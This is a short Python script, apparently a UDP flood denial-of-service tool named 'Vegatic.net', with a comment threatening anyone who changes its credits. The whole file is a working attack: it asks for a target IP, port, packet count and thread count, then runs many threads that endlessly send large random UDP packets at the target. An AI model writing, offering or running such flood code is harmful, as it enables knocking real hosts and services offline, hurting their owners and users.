#!usr/bin/env python3
#ketahuan ganti credit? gw doain mati

import random
import socket
import threading
import os,sys
os.system("clear")
print("\033[35mTools Name : Vegatic.net")
print("\033[35mAuthor : @Dino.com")
ip = str(input("-IP "))
port = int(input("-PORT "))
times = int(input("-PACKET "))
threads = int(input("-PACKAGE "))

os.system("clear")
def run():
    data = random._urandom(15000)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        
        bytes =(random.randint(1,15000000))
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Flood IP %s And Port : %s"%(ip, port))
        except:
            print("BOT ATTACKING...")
            

for y in range(threads):
        th = threading.Thread(target = run)
        th.start()
      